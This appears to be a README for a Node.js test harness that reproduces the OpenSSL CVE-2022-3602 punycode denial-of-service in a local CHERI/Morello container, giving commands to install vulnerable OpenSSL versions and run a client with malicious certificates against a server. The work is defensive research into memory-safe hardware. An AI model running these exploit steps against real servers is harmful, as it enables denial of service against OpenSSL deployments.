# OpenSSL Vulnerability PoC

Node.JS functions for testing a Denial-of-Service (DoS) attack on OpenSSL
exploiting [CVE-2022-3602](https://nvd.nist.gov/vuln/detail/CVE-2022-3602).

These functions are adapted from the
[malicious client scenario in DataDog/security-labs-pocs@d25e1ac][1]

[1]: https://github.com/DataDog/security-labs-pocs/tree/d25e1ac3a240489cda949114c732793685a1fae6/proof-of-concept-exploits/openssl-punycode-vulnerability/malicious_client

## Usage

These are currently only mocked functions, so the API may change in the future.

```javascript
import {
  MorelloPurecapOpenSSLTestCase,
  MorelloHybridOpenSSLTestCase,
} from "@nqminds/openssl-vuln-poc";

import {DockerServer} from "@nqminds/openssl-vuln-poc/src/docker.mjs";

// These are the credentials of a local morello server running
// in a docker container
const sshOptions = {
  username: "root",
  host: "127.0.0.2",
  port: 2224,
};

const dockerServer = new DockerServer({
  port: sshOptions.port,
});
// ~will take hours to download on the first time~
// Use `podman pull docker.io/aloisklink/cheribuild-edgesec:morello-purecap-20220511`
// to view progress.
// next times should take a few minutes to startup
await dockerServer.setup({quiet = false});

// or use MorelloHybridOpenSSLTestCase
const testCase = new MorelloPurecapOpenSSLTestCase({
  sshOpts: sshOptions,
});

// installs vulnerable OpenSSL versions, and caches
// `ssh` connection for 60 minutes for faster tests
await testCase.setup();

// run your tests as many times as you want
// (MorelloHybridcapOpenSSLTestCase can use the same connection)
const res = await testCase.run();
console.log(`Server output error logs were: ${res.server.stderr}`);

await dockerServer.stop();
```

## Bash scripts to implement in JavaScript

### Server

```bash
openssl s_server -accept 31050 -CAfile certs/cacert.pem -cert certs/server.cert.pem -key certs/server.key.pem  -state -verify 1
```

Results:

- Safe: Server stays active.
- Vulnerable (CHERI Hybrid): malicious payload runs and calls `Abort()`
  - Exit code: 0x86 (`SIGTRAP`)
- Vulnerable (CHERI Purecap): malicious payload is caught by CPU and is killed with `In-address space security exception (core dumped)`
  - Exit code: 0xA2 (`SIGPROT`)

## Client

```bash
openssl s_client -connect 127.0.0.1:31050 -key certs/client.key.pem  -cert certs/client.cert.pem -CAfile certs/malicious-client-cacert.pem -state
```

## Running docker commands manually

The following commands should be run automatically by the Node.JS code:

```bash
podman run -it --user root --rm --publish 127.0.0.2:2222:2222/tcp docker.io/aloisklink/cheribuild-edgesec:morello-purecap-20220511 bash -c $'
#!/usr/bin/env bash

set +e # exit on error

su --command \'mkdir /home/ubuntu/.ssh && printf "%s" "$1" > /home/ubuntu/.ssh/cheribsd-ssh-key.pub\' -- ubuntu "n/a" "$1"

# pipes everything on port 2222 to `localhost:2223`
# This is so that we can access the SSH server from outside the docker container
apt-get update && apt-get install socat --yes
socat tcp-listen:2222,reuseaddr,fork tcp:localhost:2223 &

su --command \'cd /home/ubuntu/cheribuild && ./cheribuild.py --run/ephemeral --run/ssh-forwarding-port 2223 disk-image-morello-purecap run-morello-purecap --skip-update\' -- ubuntu

# wait for socat to finish running
wait
' "arg0 (unused)" "$(cat ~/.ssh/id_ed25519.pub)"
```

Wait the ~2/3 minutes the above command will take until you get into a CHERIBSD shell.
Then you can run `pkg64c install --yes openssl-devel-3.0.2` and `pkg64 install --yes openssl-devel-3.0.2`.

Finally, you can run the following `scp` command to copy over the malicious OpenSSL certificates:

```bash
scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -r ./certs scp://root@127.0.0.2:2222/
```

### Server

#### Hybrid

(For `purecap`, use `/usr/local/bin/openssl`)

```bash
ssh -o RequestTTY=force -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no ssh://root@127.0.0.2:2222 sh -c '"/usr/local64/bin/openssl s_server -accept 31050 -CAfile certs/cacert.pem -cert certs/server.cert.pem -naccept 1 -key certs/server.key.pem -state -verify 1; exit $?"'
```

### Client

```bash
ssh -o RequestTTY=force -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no ssh://root@127.0.0.2:2222 sh -c '"openssl s_client -connect 127.0.0.1:31050 -key certs/client.key.pem -cert certs/client.cert.pem -CAfile certs/malicious-client-cacert.pem -state; exit $?"'
```
